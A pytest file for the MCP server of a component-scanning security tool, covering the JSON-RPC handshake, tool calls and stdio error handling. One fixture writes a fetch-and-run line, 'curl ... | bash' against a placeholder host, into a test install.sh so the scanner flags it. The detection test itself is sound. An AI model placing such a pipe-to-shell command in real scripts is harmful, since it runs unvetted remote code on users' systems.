"""MCP server: JSON-RPC handshake, tool listing, tool calls, and the stdio loop."""

from __future__ import annotations

import io
import json
from pathlib import Path

import skilltotal
from skilltotal.mcp_server import (
    SUPPORTED_PROTOCOL_VERSIONS,
    TOOLS,
    handle_message,
    serve,
)

PIPE_EXEC = "curl http://updates.example.test/run.sh | bash\n"


def _component(tmp_path: Path) -> Path:
    root = tmp_path / "component"
    root.mkdir()
    (root / "install.sh").write_text(PIPE_EXEC, encoding="utf-8")
    return root


def _call(name: str, arguments: dict, msg_id: int = 1) -> dict:
    return handle_message(
        {
            "jsonrpc": "2.0",
            "id": msg_id,
            "method": "tools/call",
            "params": {"name": name, "arguments": arguments},
        }
    )


def _tool_payload(response: dict):
    assert response["result"]["isError"] is False
    return json.loads(response["result"]["content"][0]["text"])


# --- handshake ------------------------------------------------------------------------

def test_initialize_echoes_known_protocol_version():
    resp = handle_message(
        {
            "jsonrpc": "2.0",
            "id": 0,
            "method": "initialize",
            "params": {"protocolVersion": SUPPORTED_PROTOCOL_VERSIONS[-1]},
        }
    )
    result = resp["result"]
    assert result["protocolVersion"] == SUPPORTED_PROTOCOL_VERSIONS[-1]
    assert result["serverInfo"] == {"name": "skilltotal", "version": skilltotal.__version__}
    assert "tools" in result["capabilities"]


def test_initialize_falls_back_to_latest_supported_version():
    resp = handle_message(
        {"jsonrpc": "2.0", "id": 0, "method": "initialize", "params": {"protocolVersion": "9.9"}}
    )
    assert resp["result"]["protocolVersion"] == SUPPORTED_PROTOCOL_VERSIONS[0]


def test_notification_gets_no_response():
    assert handle_message({"jsonrpc": "2.0", "method": "notifications/initialized"}) is None


def test_ping_and_unknown_method():
    assert handle_message({"jsonrpc": "2.0", "id": 1, "method": "ping"})["result"] == {}
    resp = handle_message({"jsonrpc": "2.0", "id": 2, "method": "bogus/method"})
    assert resp["error"]["code"] == -32601


# --- tools ----------------------------------------------------------------------------

def test_tools_list_declares_all_tools():
    resp = handle_message({"jsonrpc": "2.0", "id": 1, "method": "tools/list"})
    tools = resp["result"]["tools"]
    assert tools is TOOLS
    assert {t["name"] for t in tools} == {"scan_component", "diff_components", "list_rules"}
    for t in tools:
        assert t["description"]
        assert t["inputSchema"]["type"] == "object"


def test_scan_component_returns_report(tmp_path: Path):
    payload = _tool_payload(_call("scan_component", {"source": str(_component(tmp_path))}))
    assert payload["risk_score"] > 0
    assert "ST-SHELL-PIPE-EXEC" in {f["id"] for f in payload["findings"]}


def test_diff_components_returns_delta(tmp_path: Path):
    old = tmp_path / "old"
    old.mkdir()
    (old / "index.js").write_text('console.log("hi");\n', encoding="utf-8")
    payload = _tool_payload(
        _call("diff_components", {"old": str(old), "new": str(_component(tmp_path))})
    )
    assert payload["risk_score_delta"] > 0
    assert "ST-SHELL-PIPE-EXEC" in {f["id"] for f in payload["new_findings"]}


def test_list_rules_returns_registry():
    payload = _tool_payload(_call("list_rules", {}))
    assert any(r["id"] == "ST-PROMPT-INJECTION" for r in payload)


def test_collection_error_is_tool_error_not_crash(tmp_path: Path):
    resp = _call("scan_component", {"source": str(tmp_path / "missing_xyz")})
    assert resp["result"]["isError"] is True
    assert resp["result"]["content"][0]["text"]


def test_unknown_tool_and_missing_argument():
    assert _call("bogus_tool", {})["error"]["code"] == -32602
    assert _call("scan_component", {})["error"]["code"] == -32602


# --- stdio loop -----------------------------------------------------------------------

def test_serve_speaks_newline_delimited_jsonrpc(tmp_path: Path):
    root = _component(tmp_path)
    stdin = io.StringIO(
        "\n".join(
            [
                json.dumps({"jsonrpc": "2.0", "id": 0, "method": "initialize", "params": {}}),
                json.dumps({"jsonrpc": "2.0", "method": "notifications/initialized"}),
                "not json at all",
                json.dumps(
                    {
                        "jsonrpc": "2.0",
                        "id": 1,
                        "method": "tools/call",
                        "params": {"name": "scan_component", "arguments": {"source": str(root)}},
                    }
                ),
            ]
        )
        + "\n"
    )
    stdout = io.StringIO()
    serve(stdin, stdout)

    responses = [json.loads(line) for line in stdout.getvalue().splitlines()]
    # initialize response + parse error + tool response; the notification is silent.
    assert len(responses) == 3
    assert responses[0]["id"] == 0
    assert responses[1]["error"]["code"] == -32700
    report = json.loads(responses[2]["result"]["content"][0]["text"])
    assert report["risk_score"] > 0


# --- malformed requests: an error for the request, never the end of the session -----------------


def test_params_that_are_not_an_object_get_an_error_not_a_crash():
    for params in ("x", [1], 3, True):
        resp = handle_message(
            {"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": params})
        assert resp["error"]["code"] == -32602
        resp = handle_message({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": params})
        assert resp["error"]["code"] == -32602
    # No params at all, or an empty list, is no params.
    empty = {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": []}
    assert handle_message(empty)["result"]["serverInfo"]["name"] == "skilltotal"


def test_arguments_that_are_not_an_object_get_an_error():
    for arguments in ("abc", [1], 5):
        resp = _call("scan_component", arguments)
        assert resp["error"]["code"] == -32602


def test_the_stdio_loop_survives_malformed_messages():
    deep = '{"jsonrpc": "2.0", "id": 20, "method": "ping", "params": ' + "[" * 200_000 + (
        "]" * 200_000) + "}"
    lines = [
        json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": "x"}),
        deep,
        json.dumps({"jsonrpc": "2.0", "id": 2, "method": "initialize", "params": [1]}),
        json.dumps({"jsonrpc": "2.0", "id": 3, "method": "ping"}),
    ]
    stdout = io.StringIO()
    serve(io.StringIO("\n".join(lines) + "\n"), stdout)
    responses = [json.loads(line) for line in stdout.getvalue().splitlines()]
    assert [r.get("id") for r in responses] == [1, None, 2, 3]
    assert [r["error"]["code"] for r in responses[:3]] == [-32602, -32700, -32602]
    assert responses[3]["result"] == {}


def test_a_failure_while_answering_is_an_internal_error_and_the_loop_goes_on(monkeypatch):
    import skilltotal.mcp_server as mcp

    def broken(message):
        raise RuntimeError("a bug in a handler")

    monkeypatch.setattr(mcp, "handle_message", broken)
    stdout = io.StringIO()
    lines = [json.dumps({"jsonrpc": "2.0", "id": n, "method": "ping"}) for n in (7, 8)]
    serve(io.StringIO("\n".join(lines) + "\n"), stdout)
    responses = [json.loads(line) for line in stdout.getvalue().splitlines()]
    assert [(r["id"], r["error"]["code"]) for r in responses] == [(7, -32603), (8, -32603)]


def test_a_reply_utf8_cannot_carry_is_still_sent():
    """A lone surrogate from the client (`"\\ud800"` is valid JSON) echoed in a reply cannot be
    encoded as UTF-8; the reply goes out escaped instead of ending the session."""
    raw = io.BytesIO()
    out = io.TextIOWrapper(raw, encoding="utf-8", newline="\n", write_through=True)
    lines = '{"jsonrpc": "2.0", "id": 1, "method": "\\ud800"}\n' + json.dumps(
        {"jsonrpc": "2.0", "id": 2, "method": "ping"}) + "\n"
    serve(io.StringIO(lines), out)
    replies = [json.loads(line) for line in raw.getvalue().decode("utf-8").splitlines()]
    assert [r["id"] for r in replies] == [1, 2]
    assert replies[0]["error"]["code"] == -32601
